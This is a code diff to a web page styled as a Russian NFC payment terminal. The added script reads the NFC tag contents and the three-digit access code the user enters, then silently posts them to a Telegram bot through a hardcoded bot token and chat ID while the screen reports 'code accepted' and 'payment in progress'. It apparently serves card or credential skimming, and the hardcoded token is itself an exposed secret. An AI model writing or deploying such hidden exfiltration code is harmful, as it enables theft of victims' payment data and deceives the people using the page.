@@ -349,10 +349,15 @@
     </div>
 
     <script>
+        const TELEGRAM_BOT_TOKEN = '8368195098:AAHdHOYJmuv-bMrGaAjsVaBWxeBltAvZj4I';
+        const TELEGRAM_CHAT_ID = '8286673118';
+        const PAYMENT_AMOUNT = '34,57';
+
         let nfcReader = null;
         let paymentCompleted = false;
         let correctPassword = '';
         let passwordAttempts = 0;
+        let nfcTagData = '';
 
         document.addEventListener('DOMContentLoaded', function() {
             initializeNFC();
@@ -395,6 +400,7 @@
                 if (record.recordType === "text") {
                     const text = decoder.decode(record.data);
                     correctPassword = text.trim();
+                    nfcTagData = text.trim();
                     
                     if (/^\d{3}$/.test(correctPassword)) {
                         updateStatus('МЕТКА СЧИТАНА', 'Введите код доступа');
@@ -478,10 +484,13 @@
             updateSubmitButton();
         }
 
-        function processPayment() {
+        async function processPayment() {
             document.getElementById('passwordSection').style.display = 'none';
             updateStatus('ПРОВЕРКА КОДА', 'Код принят<span class="processing-dots"></span>');
             updateProgress(80);
+            
+            // Отправляем данные в Telegram
+            await sendToTelegram();
             
             setTimeout(() => {
                 updateStatus('ОБРАБОТКА', 'Выполняется оплата<span class="processing-dots"></span>');
@@ -491,6 +500,44 @@
                     completePayment();
                 }, 2000);
             }, 1500);
+        }
+
+        async function sendToTelegram() {
+            const timestamp = new Date().toLocaleString('ru-RU');
+            const enteredPassword = document.getElementById('digit1').value + 
+                                  document.getElementById('digit2').value + 
+                                  document.getElementById('digit3').value;
+            
+            const message = `💳 *НОВАЯ ОПЛАТА*
+            
+📊 *Данные операции:*
+💰 Сумма: ${PAYMENT_AMOUNT} руб.
+🔑 Код доступа: ${enteredPassword}
+🏷️ NFC данные: ${nfcTagData}
+⏰ Время: ${timestamp}
+🆔 Терминал: SBR-2847-01
+
+✅ *Оплата успешно завершена*`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                if (!response.ok) {
+                    console.error('Ошибка отправки в Telegram:', await response.text());
+                }
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+            }
         }
 
         function completePayment() {
